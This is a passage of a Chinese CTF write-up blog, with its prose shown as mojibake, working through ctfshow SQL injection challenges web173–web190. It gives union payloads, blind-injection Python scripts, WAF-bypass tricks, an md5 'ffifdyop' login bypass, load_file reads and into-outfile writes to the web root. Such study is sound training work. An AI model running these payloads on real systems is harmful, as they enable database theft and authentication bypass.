è¿‡æ»¤æ³¨å…¥2å°±æœ‰è¿™ä¸ªè¿‡æ»¤ï¼Œå°±æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿˜æ˜¯æ³¨å‡ºæ¥äº†</p><pre class="language-php" data-language="php"><code class="language-php">if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;æŸ¥è¯¢æˆåŠŸ&#39;;&#125;</code></pre><p>æŸ¥è¯¢åˆ°çš„å†…å®¹ä¸èƒ½æœ‰flagè¿™ä¸ªå­—ç¬¦ä¸²ï¼Œç®€å•ä¸€ç‚¹å°±æ˜¯ä¸æŸ¥usernameåˆ—ï¼Œç›´æ¥çœ‹passwordå°±è¡Œã€‚æˆ–è€…ç”¨to_base64()æ¥å¯¹usernameè¿›è¡Œç¼–ç </p><p>æœ€ç»ˆpayload</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39; union select group_concat(id,to_base64(username),password),2,3 from ctfshow_user3 --+ </code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509172125292.png" alt="image-20220509172125292"></p><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag    if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123;      $ret[&#39;msg&#39;]&#x3D;&#39;æŸ¥è¯¢æˆåŠŸ&#39;;    &#125;</code></pre><p>ä¸å…‰è¿‡æ»¤äº†flagï¼Œè¿˜è¿‡æ»¤äº†æ•°å­—ï¼Œç›²æ³¨çœ‹èµ·æ¥æ˜¯æœ€å¥½çš„é€‰æ‹©äº†ï¼Œçœ‹å¤§éƒ¨åˆ†çš„wpä¹Ÿéƒ½æ˜¯ç›²æ³¨</p><pre class="language-python" data-language="python"><code class="language-python"># @Author:Y4tackerimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show&#x2F;api&#x2F;v4.php?id&#x3D;1&#39; and &quot;result &#x3D; &#39;&#39;i &#x3D; 0while True:    i &#x3D; i + 1    head &#x3D; 32    tail &#x3D; 127    while head &lt; tail:        mid &#x3D; (head + tail) &gt;&gt; 1        payload &#x3D; f&#39;1&#x3D;if(ascii(substr((select  password from ctfshow_user4 limit 24,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) -- -&#39;        r &#x3D; requests.get(url + payload)        if &quot;admin&quot; in r.text:            head &#x3D; mid + 1        else:            tail &#x3D; mid    if head !&#x3D; 32:        result +&#x3D; chr(head)    else:        break    print(result)</code></pre><pre class="language-python" data-language="python"><code class="language-python"># by macchiatoimport requestsimport stringflag &#x3D; &#39;&#39;table &#x3D; string.digits + string.ascii_letters + &#39;-&#123;&#125;&#39;for i in range(1, 45):    for j in table:        url &#x3D; &quot;http:&#x2F;&#x2F;dcfd2cf7-1f37-408e-a4d1-c834d09ac388.chall.ctf.show&#x2F;&#x2F;api&#x2F;v4.php?id&#x3D;&quot;        payload &#x3D; &#39;&#39;&#39;1&#39; and substr((select password from ctfshow_user4 where username&#x3D;&quot;flag&quot;),&#123;&#125;,1)&#x3D;&quot;&#123;&#125;&quot;--+&#39;&#39;&#39;.format(i,j)        r &#x3D; requests.get(url + payload)        if &quot;admin&quot; in r.text:            flag +&#x3D; j            print(flag)            break</code></pre><p>æˆ‘è¿™é‡Œå°±ä¸è·‘äº†ï¼Œç›´æ¥è´´è„šæœ¬ã€‚</p><p>è¿˜æœ‰ä¸€ç§æ˜¯å°†æ•°å­—æ›¿æ¢ä¸ºå­—æ¯</p><p>ä½†æœ¬æ¥çš„flagä¸­ä¸€å®šä¹Ÿä¼šæœ‰ä¸€äº›å°å†™å­—æ¯ï¼Œè¿™æ ·çš„è¯å°±æ²¡åŠæ³•åˆ†è¾¨é‚£ä¸ªæ˜¯åŸæœ¬çš„å­—æ¯å“ªä¸ªæ˜¯æ›¿æ¢å‡ºæ¥çš„ã€‚</p><p>æ‰€ä»¥ä¸ºäº†é¿å…è¿™ä¸ªé—®é¢˜ï¼Œå°†passwordé¦–å…ˆhexä¸€ä¸‹ï¼Œå› ä¸ºhex()å‡½æ•°çš„è¿”å›å€¼ä¸­å­—æ¯éƒ½æ˜¯å¤§å†™çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿”å›ç»“æœä¸­çš„å°å†™å­—æ¯å°±æ˜¯åŸæ¥çš„æ•°å­—ï¼Œè€Œå¤§å†™å­—æ¯å°±æ˜¯åŸæœ¬çš„å­—ç¬¦ã€‚</p><p>è¿™ä¸ªè™½ç„¶è¯´æ¯”è¾ƒéº»çƒ¦ï¼Œä½†ä¹Ÿæ˜¯ä¸€ç§å¾ˆå¥½çš„è§£é¢˜æ€è·¯ã€‚</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select &#39;q&#39;,(select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),&#39;1&#39;,&#39;q&#39;),&#39;2&#39;,&#39;w&#39;),&#39;3&#39;,&#39;e&#39;),&#39;4&#39;,&#39;r&#39;),&#39;5&#39;,&#39;t&#39;),&#39;6&#39;,&#39;y&#39;),&#39;7&#39;,&#39;u&#39;),&#39;8&#39;,&#39;i&#39;),&#39;9&#39;,&#39;o&#39;),&#39;0&#39;,&#39;p&#39;) from ctfshow_user4 where username&#x3D;&#39;flag&#39;)--+</code></pre><h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F;æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag    if(!preg_match(&#39;&#x2F;[\x00-\x7f]&#x2F;i&#39;, json_encode($ret)))&#123;      $ret[&#39;msg&#39;]&#x3D;&#39;æŸ¥è¯¢æˆåŠŸ&#39;;    &#125;</code></pre><p>æŠŠå­—ç¬¦å…¨banäº†</p><p>ä¸èƒ½é€šè¿‡å›æ˜¾æ¥å¸ƒå°”ç›²æ³¨äº†ï¼Œå¯ä»¥åˆ©ç”¨æ—¶é—´ç›²æ³¨</p><pre class="language-python" data-language="python"><code class="language-python">import timeimport requestsurl &#x3D; &#39;http:&#x2F;&#x2F;5adcc7d3-c4d3-440a-8f3e-a4b93e6b61e4.challenge.ctf.show&#x2F;api&#x2F;v5.php&#39;flag &#x3D; &#39;&#39;for i in range(60):    lenth &#x3D; len(flag)    min,max &#x3D; 32,128    while True:        j &#x3D; min + (max-min)&#x2F;&#x2F;2        if(min &#x3D;&#x3D; j):            flag +&#x3D; chr(j)            print(flag)            break        payload &#x3D; f&quot;?id&#x3D;&#39; union select &#39;a&#39;,if(ascii(substr((select group_concat(password) from ctfshow_user5 where username&#x3D;&#39;flag&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.5),&#39;False&#39;) --+&quot;        start_time &#x3D; time.time()        r &#x3D; requests.get(url&#x3D;url+payload).text        end_time &#x3D; time.time()        sub &#x3D; end_time - start_time        if(sub &gt;&#x3D; 0.5):            max &#x3D; j        else:            min &#x3D; j</code></pre><p>è¿˜å¯ä»¥ç”¨<code>into outfile</code>å’Œ<code>dumpfile</code>æ¥å†™shell</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39; union select username,password from ctfshow_user5 where username&#x3D;&#39;flag&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt&#39; --+-1&#39; union select username,password from ctfshow_user5 where username&#x3D;&#39;flag&#39; into dumpfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt&#39; --+</code></pre><h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>è¯•äº†ä¸€ä¸‹ï¼Œæ˜¯è¿‡æ»¤äº†å°å†™çš„selectï¼Œå˜ä¸ªå¤§å†™å­—æ¯å°±è¡Œ</p><pre class="language-sql" data-language="sql"><code class="language-sql">id&#x3D;-1&#39; union Select group_concat(column_name),2,3  from information_schema.columns where table_name&#x3D;&#39;ctfshow_user&#39;--+ &#x2F;&#x2F;æŸ¥åˆ—æœ€ç»ˆpayload-1&#39; union Select group_concat(id,username,password),2,3  from ctfshow_user--+ </code></pre><h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œ-ï¼Œ+ï¼Œ#ï¼Œï¼Œorï¼Œç©ºæ ¼å¯ä»¥ç”¨/**/ç»•è¿‡æ³¨é‡Šå¯ä»¥ç”¨#çš„urlç¼–ç %23ï¼Œorå¯ä»¥ç”¨||æ›¿ä»£</p><p>å› ä¸ºæ²¡æœ‰è¿‡æ»¤ï¼Œæ‰€ä»¥ç›´æ¥ä¸‡èƒ½å¯†ç å°±èƒ½å‡º</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;||1%23</code></pre><p>æ­£ç»æ³¨å…¥çš„è¯å·®ä¸å¤šå°±æ˜¯è¿™æ ·</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,password&#x2F;**&#x2F;from&#x2F;**&#x2F;ctfshow_user%23</code></pre><h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>æˆ‘æœ‰ç‚¹çœ‹ä¸æ‡‚è¿™ä¸ªè¿‡æ»¤äº†</p><p>ä¸ºä»€ä¹ˆ1â€˜or1%23ä¸è¡Œ1â€™||1%23å¯ä»¥ï¼Œ1â€˜or(1)%23å¯ä»¥ï¼Œ1â€™or(1=1)%23å¯ä»¥å‘¢</p><p>oråè¾¹è·Ÿçš„ä¸€å®šè¦å­˜åœ¨ç©ºæ ¼å—,æ˜¯æˆ‘è®°é”™äº†å—ã€‚ã€‚ã€‚</p><p>è¿™ä¸ªè¿‡æ»¤äº†ç©ºæ ¼ï¼Œ*ï¼Œé‚£ä¹ˆç”¨/**/å½“ç©ºæ ¼æ˜¯ä¸è¡Œçš„ï¼Œä½†æ˜¯å¯ä»¥ç”¨%09 %0a %0d  %0c  +ä¹‹ç±»çš„æ›¿ä»£ç©ºæ ¼ï¼Œæˆ–è€…åˆ©ç”¨æ‹¬å·</p><p>æ­£ç»çš„æ³¨å…¥çš„è¯</p><p>payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;union%09select%091,2,password%09from%09ctfshow_user%23</code></pre><h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;||1&#x3D;1%23</code></pre><p>ä¸‡èƒ½å¯†ç è¿˜æ˜¯å¯ä»¥</p><p>æˆ–è€…åˆ©ç”¨%0cä»£æ›¿ç©ºæ ¼</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23</code></pre><p>æˆ–è€…ç©ºæ ¼</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;union(select(1),2,(password)from(ctfshow_user))%23</code></pre><h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>%23ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯%0cè¿˜èƒ½ç”¨ï¼Œ-ä¹Ÿèƒ½ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨</p><p>--%0cæ¥ä»£æ›¿--+çš„ç©ºæ ¼ï¼Œåªè¦æŠŠä¸Šä¸€é¢˜çš„ç”¨æ¥æ³¨é‡Šçš„%23æ”¹æˆ--%0cå°±è¡Œäº†</p><p>æˆ–è€…ä¸è¦æ³¨é‡Šç¬¦è®©åé¢çš„å•å¼•å·èƒ½å¤Ÿé—­åˆ</p><p>æ¯”å¦‚</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;%0cunion%0cselect&#39;1&#39;,(select%0cgroup_concat(password)from&#96;ctfshow_user&#96;),&#39;3</code></pre><p>æˆ–è€…è¿™ç§</p><p>1111&#39;or(id=26)and&#39;a&#39;=&#39;a</p><p>å› ä¸ºsqlä¸­andä¼˜å…ˆçº§é«˜äºoræ‰€ä»¥å°±ä¼šå˜æˆ</p><pre class="language-none"><code class="language-none">(username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;11&#39;) or (id&#x3D;26and&#39;a&#39;&#x3D;&#39;a&#39;)</code></pre><h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><pre class="language-php" data-language="php"><code class="language-php">function waf($str)&#123;  return preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select&#x2F;i&#39;, $str);&#125;</code></pre><p>ç»™äº†wafå‡½æ•°çš„å†…å®¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509204736531.png" alt="image-20220509204736531"></p><p>ä¸è¦æ³¨é‡Šç›´æ¥é—­åˆï¼Œç„¶ååˆ©ç”¨idæŸ¥å‡ºflag</p><p>å¸¸è§„çš„æ³¨å…¥åœ¨è¿™ç§æ²¡æ³¨é‡Šç¬¦çš„æƒ…å†µä¸‹ä¸€èˆ¬éƒ½æ˜¯ç”¨</p><p>â€™1â€™=&#39;1æ¥æ›¿ä»£äº†%23</p><h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h2><pre class="language-none"><code class="language-none">function waf($str)&#123;  return preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag&#x2F;i&#39;, $str);&#125;</code></pre><p>åŒæ ·æ˜¯åˆ©ç”¨orå’Œandçš„ä¼˜å…ˆçº§é—®é¢˜ï¼Œåˆ©ç”¨idæŸ¥å‡ºflag</p><p>1111&#39;or(id=26)and&#39;a&#39;=&#39;a</p><h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>æ”¹æˆpostæ–¹å¼äº†</p><p>ç­‰äºå’Œselectè¢«è¿‡æ»¤äº†ï¼Œçœ‹èµ·æ¥åªèƒ½åˆ©ç”¨likeè¿›è¡Œç›²æ³¨äº†</p><pre class="language-sql" data-language="sql"><code class="language-sql">tableName&#x3D;(ctfshow_user)where(pass)like&#39;ctfshow&#123;%&#39;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509211946454.png" alt="image-20220509211946454"></p><p>è¿”å›ä¸º1ï¼Œè¯´æ˜ç¡®å®æœ‰è¿™ä¸ªå­—æ®µï¼Œç„¶åå°±æ˜¯åˆ©ç”¨ç›²æ³¨äº†</p><p>å·ä¸€ä¸‹å—æ–¹å¸ˆå‚…çš„è„šæœ¬</p><pre class="language-none"><code class="language-none">#-- coding:UTF-8 --# Author:dota_st# Date:2021&#x2F;4&#x2F;8 21:24# blog: www.wlhhlc.topimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;adb1f64a-e1fd-4640-aeb5-b49da1a62390.challenge.ctf.show:8080&#x2F;select-waf.php&quot;str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;flag &#x3D; &quot;ctfshow&quot;for i in range(0,666):    for j in str:        data &#x3D; &#123;&quot;tableName&quot;:&quot;(ctfshow_user)where(pass)like&#39;&#123;0&#125;%&#39;&quot;.format(flag+j)&#125;        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)        if &quot;$user_count &#x3D; 1&quot; in res.text:            flag +&#x3D; j            print(flag)            if j&#x3D;&#x3D;&quot;&#125;&quot;:                exit()            break</code></pre><h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><pre class="language-php" data-language="php"><code class="language-php">function waf($str)&#123;   return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str); &#125;</code></pre><p>è¿‡æ»¤çš„ç¡®å®æœ‰ç‚¹å¤š</p><p>è¿™é‡Œè¿whereä¹Ÿè¿‡æ»¤äº†ï¼Œå¯ä»¥åˆ©ç”¨right joinï¼Œå³è¿æ¥çš„æ–¹å¼æŸ¥è¡¨</p><p><a href="https://blog.csdn.net/weixin_48083470/article/details/119043137">https://blog.csdn.net/weixin_48083470/article/details/119043137</a></p><p>åˆ©ç”¨åå…­è¿›åˆ¶æ¥ç»•è¿‡æœ€åçš„å¼•å·ï¼Œå­—æ®µçŒœæµ‹å’Œä¸Šä¸ªé¢˜ä¸€æ ·åœ¨passé‡Œ</p><pre class="language-sql" data-language="sql"><code class="language-sql">tableName&#x3D;ctfshow_user as a right join ctfshow_user as b on b.pass like 0x63746673686f7725</code></pre><p>å¯ä»¥çœ‹åˆ°æœ‰è¿”å›å€¼ï¼Œæ‰€ä»¥å°±å¯ä»¥ä¸Šè„šæœ¬è·‘äº†</p><p>å†å·ä¸€ä¸‹å—æ–¹å¸ˆå‚…çš„è„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python">#-- coding:UTF-8 --# Author:dota_st# Date:2021&#x2F;4&#x2F;8 21:24# blog: www.wlhhlc.topimport requestsimport binasciidef to_hex(s):    # å­—ç¬¦ä¸²è½¬16è¿›åˆ¶    str_16 &#x3D; binascii.b2a_hex(s.encode(&#39;utf-8&#39;))      str_16 &#x3D; bytes.decode(str_16)    res &#x3D; str_16.replace(&quot;b&#39;&quot;,&quot;&quot;).replace(&quot;&#39;&quot;,&quot;&quot;)    return resurl &#x3D; &quot;http:&#x2F;&#x2F;4d223a13-c7d6-4213-9c81-d388a5c26634.challenge.ctf.show:8080&#x2F;select-waf.php&quot;str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;flag &#x3D; &quot;ctfshow&quot;for i in range(0,666):    for j in str:        result &#x3D; &quot;0x&quot; + to_hex(flag + j + &quot;%&quot;)        data &#x3D; &#123;&quot;tableName&quot;:&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;0&#125;&quot;.format(result)&#125;        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)        if &quot;$user_count &#x3D; 43&quot; in res.text:            flag +&#x3D; j            print(flag)            if j&#x3D;&#x3D;&quot;&#125;&quot;:                exit()            break</code></pre><h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><pre class="language-php" data-language="php"><code class="language-php">function waf($str)&#123;   return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str); &#125;</code></pre><p>è¿™ä¸ªwafï¼ŒæŠŠæ•°å­—ä¹Ÿå…¨banäº†ï¼Œé‚£å°±ä¸èƒ½ç”¨åå…­è¿›åˆ¶äº†ï¼Œä½†æ˜¯å¼•å·ä¸€æ ·è¢«banäº†</p><p>æ”¾å¼ å›¾</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/20201127190309995.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å†å·ä¸€ä¸ªå—æ–¹å¸ˆå‚…çš„è„šæœ¬</p><p>è¿™é‡Œä¸»è¦æ˜¯åˆ©ç”¨äº†mysqlé‡Œtrue=1 true+true=2çš„ç‰¹æ€§ï¼Œç¡¬åŠ trueè®©æ•°å€¼ç­‰äºæˆ‘ä»¬è¦çš„å­—æ¯çš„ASCIIç å€¼ï¼Œç„¶ååœ¨å¤–é¢å¥—ä¸ªchrè½¬åŒ–ä¸ºå­—ç¬¦ï¼Œå†åˆ©ç”¨concatè¿›è¡Œæ‹¼æ¥</p><pre class="language-none"><code class="language-none">#-- coding:UTF-8 --# Author:dota_st# Date:2021&#x2F;4&#x2F;8 21:24# blog: www.wlhhlc.topimport requestsdef createNum(n):    str &#x3D; &#39;true&#39;    if n &#x3D;&#x3D; 1:        return &#39;true&#39;    else:        for i in range(n - 1):            str +&#x3D; &quot;+true&quot;    return str#æŠŠæ¯ä¸€ä¸ªå­—ç¬¦è½¬æ¢æˆasciiç å¯¹åº”çš„æ•°å€¼def change_str(s):    str&#x3D;&quot;&quot;    str+&#x3D;&quot;chr(&quot;+createNum(ord(s[0]))+&quot;)&quot;    for i in s[1:]:        str+&#x3D;&quot;,chr(&quot;+createNum(ord(i))+&quot;)&quot;    return strurl &#x3D; &quot;http:&#x2F;&#x2F;c0323dfb-fa55-4925-9c61-2e4b8c64e835.challenge.ctf.show:8080&#x2F;select-waf.php&quot;str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;flag &#x3D; &quot;ctfshow&quot;for i in range(0,666):    for j in str:        result &#x3D; change_str(flag + j + &quot;%&quot;)        data &#x3D; &#123;&quot;tableName&quot;:&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like(concat(&#123;0&#125;))&quot;.format(result)&#125;        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)        if &quot;$user_count &#x3D; 43;&quot; in res.text:            flag +&#x3D; j            print(flag)            if j&#x3D;&#x3D;&quot;&#125;&quot;:                exit()            break</code></pre><h2 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h2><pre class="language-none"><code class="language-none">function waf($str)&#123;  return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str);&#125;</code></pre><p>è™½ç„¶å¤šåŠ äº†å‡ ä¸ªï¼Œä½†æ˜¯ä¸Šä¸€é¢˜çš„è„šæœ¬å¯ä»¥æ¥ç€ç”¨</p><h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>æ˜¯ç™»å½•é¡µé¢ï¼Œè¦æ±‚ä»¥adminçš„è´¦æˆ·ç™»å½•ï¼Œä½†æ˜¯å¯¹usernameçš„éªŒè¯æ²¡æ³•ç»•è¿‡ï¼Œåªèƒ½åˆ©ç”¨passwordçš„éƒ¨åˆ†</p><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·  $sql &#x3D; &quot;select count(*) from ctfshow_user where username &#x3D; &#39;$username&#39; and password&#x3D; &#39;$password&#39;&quot;;      </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">$username &#x3D; $_POST[&#39;username&#39;];$password &#x3D; md5($_POST[&#39;password&#39;],true);&#x2F;&#x2F;åªæœ‰adminå¯ä»¥è·å¾—flagif($username!&#x3D;&#39;admin&#39;)&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åä¸å­˜åœ¨&#39;;    die(json_encode($ret));&#125;  </code></pre><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„passwordæ˜¯md5çš„å½¢å¼ï¼Œè€Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªå¾ˆç‰¹æ®Šçš„å­—ç¬¦ä¸²ffifdyop</p><pre class="language-none"><code class="language-none">md5(&quot;ffifdyop&quot;,true) &#x3D; &#39;or&#39;6]!r,b</code></pre><p>å°†è¿™ä¸ªæ”¾åœ¨å¯†ç é‡Œï¼Œæ•´ä¸ªæŸ¥è¯¢è¯­å¥å°±ä¼šè¢«é—­åˆ</p><pre class="language-none"><code class="language-none">select count(*) from ctfshow_user where username &#x3D; &#39;$username&#39; and password&#x3D;&#39;&#39;or&#39;6]!r,b&#39;ä¹Ÿå°±æ˜¯ï¼šselect count(*) from ctfshow_user where username &#x3D; &#39;$username&#39; and password&#x3D; &#39;&#39;or &#39;6]!r,b&#39;ä¹Ÿå°±æ˜¯ï¼šselect count(*) from ctfshow_user where FALSE or TRUEorçš„å­˜åœ¨é…åˆåé¢çš„TRUEå°±ç»•è¿‡äº†</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509221244579.png" alt="image-20220509221244579"></p><h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><pre class="language-none"><code class="language-none"> $sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#123;$username&#125;&quot;;&#x2F;&#x2F;å¯†ç åˆ¤æ–­  if($row[&#39;pass&#39;]&#x3D;&#x3D;intval($password))&#123;      $ret[&#39;msg&#39;]&#x3D;&#39;ç™»é™†æˆåŠŸ&#39;;      array_push($ret[&#39;data&#39;], array(&#39;flag&#39;&#x3D;&gt;$flag));    &#125;</code></pre><p>åœ¨where username=0è¿™æ ·çš„æŸ¥è¯¢ä¸­ï¼Œå› ä¸ºusernameéƒ½ä¼šæ˜¯å­—ç¬¦ä¸²ï¼Œåœ¨mysqlä¸­å­—ç¬¦ä¸²ä¸æ•°å­—è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä»¥å­—æ¯å¼€å¤´çš„å­—ç¬¦ä¸²éƒ½ä¼šè½¬æ¢æˆæ•°å­—0ï¼Œå› æ­¤è¿™ä¸ªwhereå¯ä»¥æŠŠæ‰€æœ‰ä»¥å­—æ¯å¼€å¤´çš„æ•°æ®æŸ¥å‡ºæ¥</p><p>è€Œif($row[â€˜passâ€™]==intval($password)) ä¹Ÿæ˜¯å¼±æ¯”è¾ƒï¼ŒæŸ¥å‡ºæ¥çš„ä¹Ÿæ˜¯å­—æ¯å¼€å¤´çš„</p><p>æ‰€ä»¥payloadä¸º</p><pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;0&amp;password&#x3D;0</code></pre><p>ä½†æ³¨æ„ï¼Œå¦‚æœæœ‰æŸä¸ªæ•°æ®ä¸æ˜¯ä»¥å­—æ¯å¼€å¤´ï¼Œæ˜¯åŒ¹é…ä¸æˆåŠŸçš„ï¼Œè¿™ç§æƒ…å†µæ€ä¹ˆåŠï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>||</code>è¿ç®—ç¬¦</p><pre class="language-none"><code class="language-none">username&#x3D;1||1&amp;password&#x3D;0</code></pre><h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2><p>å…ˆè¯•ä¸€ä¸‹ä¸Šä¸€é¢˜çš„payloadï¼Œå‘ç°æ²¡æˆåŠŸï¼Œä¼°è®¡æ˜¯æ•°å­—å¼€å¤´çš„äº†ï¼Œè€Œé¢˜ç›®æç¤ºflagåœ¨api/index.phpé‡Œæ„Ÿè§‰å°±æ˜¯åˆ©ç”¨load_fileè¯»æ–‡ä»¶äº†</p><p>load_file()ï¼Œç”¨æ³•ä¸€èˆ¬æ˜¯select load_file(xxxx)</p><pre class="language-none"><code class="language-none">LOAD_FILE(file_name)ï¼š è¯»å–æ–‡ä»¶å¹¶è¿”å›æ–‡ä»¶å†…å®¹ä¸ºå­—ç¬¦ä¸²ã€‚è¦ä½¿ç”¨æ­¤å‡½æ•°ï¼Œæ–‡ä»¶å¿…é¡»ä½äºæœåŠ¡å™¨ä¸»æœºä¸Šï¼Œå¿…é¡»æŒ‡å®šå®Œæ•´è·¯å¾„çš„æ–‡ä»¶ï¼Œè€Œä¸”å¿…é¡»æœ‰FILEæƒé™ã€‚regexpï¼š mysqlä¸­çš„æ­£åˆ™è¡¨è¾¾å¼æ“ä½œç¬¦</code></pre><pre class="language-none"><code class="language-none">#-- coding:UTF-8 --# Author:dota_st# Date:2021&#x2F;4&#x2F;15 22:14# blog: www.wlhhlc.topimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;e232d7fb-b70d-4123-a740-369d7137c5dd.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot;all_str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;flag &#x3D; &quot;ctfshow&#123;&quot;for i in range(200):    for j in all_str:        data &#x3D; &#123;            &quot;username&quot;:&quot;if(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php&#39;)regexp(&#39;&#123;0&#125;&#39;),0,1)&quot;.format(flag + j),            &#39;password&#39;:0        &#125;        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in res.text:            flag +&#x3D;j            print(flag)            break        if j&#x3D;&#x3D;&#39;&#125;&#39;:            exit()</code></pre><h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¯†ç æ£€æµ‹if(!is_numeric($password))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;å¯†ç åªèƒ½ä¸ºæ•°å­—&#39;;  die(json_encode($ret));&#125;&#x2F;&#x2F;å¯†ç åˆ¤æ–­if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;ç™»é™†æˆåŠŸ&#39;;  